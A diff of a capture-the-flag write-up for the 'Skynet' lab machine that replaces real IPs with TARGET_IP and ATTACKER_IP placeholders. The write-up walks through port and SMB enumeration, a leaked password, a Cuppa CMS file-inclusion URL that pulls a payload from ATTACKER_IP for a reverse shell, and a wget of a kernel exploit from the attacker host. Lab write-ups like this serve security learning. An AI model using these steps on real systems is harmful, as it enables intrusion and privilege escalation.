@@ -20,7 +20,7 @@ $ sudo openvpn --config NovusEdge.ovpn
 
 Performing an `nmap` scan to check for open ports and services:
 ```shell-session
-$ sudo nmap -sS -Pn -vv --top-ports 2000 -oN nmap_scan.txt 10.10.138.207
+$ sudo nmap -sS -Pn -vv --top-ports 2000 -oN nmap_scan.txt TARGET_IP
 
 PORT    STATE SERVICE      REASON
 22/tcp  open  ssh          syn-ack ttl 63
@@ -31,7 +31,7 @@ PORT    STATE SERVICE      REASON
 445/tcp open  microsoft-ds syn-ack ttl 63
 
 # Performing a service scan:
-$ sudo nmap -sV -vv -p22,80,110,139,143,445 -oN service_scan.txt 10.10.138.207
+$ sudo nmap -sV -vv -p22,80,110,139,143,445 -oN service_scan.txt TARGET_IP
 
 PORT    STATE SERVICE     REASON         VERSION
 22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
@@ -48,7 +48,7 @@ There's a http service running on port 80. If we visit the site using a browser,
 
 Using `gobuster` to enumerate any potentially interesting directories:
 ```shell-session
-$ gobuster dir -u http://10.10.138.207 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 32 -x txt,php,sh,py,phtml,html
+$ gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 32 -x txt,php,sh,py,phtml,html
 ...
 ...
 
@@ -62,12 +62,12 @@ We'll hold onto this information for later use...
 
 Using `enum4linux` to enumerate the samba service running on target:
 ```shell-session
-$ enum4linux  10.10.138.207
+$ enum4linux  TARGET_IP
 
 ...
 [+] Got domain/workgroup name: WORKGROUP
 ...
-[+] Server 10.10.138.207 allows sessions using username '', password ''
+[+] Server TARGET_IP allows sessions using username '', password ''
 ...
         Sharename       Type      Comment
         ---------       ----      -------
@@ -85,16 +85,16 @@ Reconnecting with SMB1 for workgroup listing.
         WORKGROUP            SKYNET
 
 ...
-[+] Attempting to map shares on 10.10.138.207                                                                                                                                                
+[+] Attempting to map shares on TARGET_IP                                                                                                                                                
                                                                                                                                                                                              
-//10.10.138.207/print$  Mapping: DENIED Listing: N/A Writing: N/A                                                                                                                            
-//10.10.138.207/anonymous       Mapping: OK Listing: OK Writing: N/A
-//10.10.138.207/milesdyson      Mapping: DENIED Listing: N/A Writing: N/A
+//TARGET_IP/print$  Mapping: DENIED Listing: N/A Writing: N/A                                                                                                                            
+//TARGET_IP/anonymous       Mapping: OK Listing: OK Writing: N/A
+//TARGET_IP/milesdyson      Mapping: DENIED Listing: N/A Writing: N/A
 
 [E] Can't understand response:                                                                                                                                                               
                                                                                                                                                                                              
 NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                                                                                                   
-//10.10.138.207/IPC$    Mapping: N/A Listing: N/A Writing: N/A
+//TARGET_IP/IPC$    Mapping: N/A Listing: N/A Writing: N/A
 
 ...
 ...
@@ -103,7 +103,7 @@ NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
 Since the samba service allows anonymous logins, we can try to log into the service using `smbclient`:
 ```shell-session
 # Using an empty password...
-$ smbclient //10.10.138.207/anonymous
+$ smbclient //TARGET_IP/anonymous
 smb: \> ls
   .                                   D        0  Thu Nov 26 19:34:00 2020
   ..                                  D        0  Tue Sep 17 11:50:17 2019
@@ -156,7 +156,7 @@ Password: )s{A&2Z=F^n_E.B`
 
 Using this password, we can now log into the smb service as miles and get more information to exploit further:
 ```shell-session
-$ smbclient -U milesdyson //10.10.19.186/milesdyson
+$ smbclient -U milesdyson //TARGET_IP/milesdyson
 Password for [WORKGROUP\milesdyson]:
 Try "help" to get a list of possible commands.
 smb: \> ls
@@ -204,7 +204,7 @@ Visiting the hidden directory takes us to the following page:
 
 Using `ffuf` to search for more directories within this one, we quickly find a result:
 ```shell-session
-$ ffuf -u http://10.10.19.186/45kra24zxs28v3yd/FUZZ -t 64 -w /usr/share/seclists/Discovery/Web-Content/common.txt
+$ ffuf -u http://TARGET_IP/45kra24zxs28v3yd/FUZZ -t 64 -w /usr/share/seclists/Discovery/Web-Content/common.txt
 ...
 ...
 .htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 863ms]
@@ -216,7 +216,7 @@ index.html              [Status: 200, Size: 418, Words: 45, Lines: 16, Duration:
 
 
 visiting the `administrator` directory takes us to a login page:
-![](cuppa-login.png)
+![]cuppa-login.png)
 
 Using `searchsploit` to search for an exploit yields the following results:
 ```shell-session
@@ -242,7 +242,7 @@ $ rlwrap -cAr nc -lvnp 4446
 
 ```
 
-Accessing the URL: `http://10.10.19.186/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.11.5.201:4443/payload.php` gives us a reverse shell. Using this, we can get the user flag:
+Accessing the URL: `http://TARGET_IP/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://ATTACKER_IP:4443/payload.php` gives us a reverse shell. Using this, we can get the user flag:
 ```shell-session
 www-data@skynet:/$ cd /home/milesdyson/
 www-data@skynet:/home/milesdyson$ ls
@@ -269,7 +269,7 @@ For this challenge, I'll be making use of [CVE-2017-16995](https://nvd.nist.gov/
 
 ```shell-session
 www-data@skynet:/home/milesdyson$ cd /tmp
-www-data@skynet:/tmp$ wget http://10.11.5.201:4443/45010.c
+www-data@skynet:/tmp$ wget http://ATTACKER_IP:4443/45010.c
 ...
 2022-12-09 13:50:50 (28.2 KB/s) - '45010.c' saved [13728/13728]
 
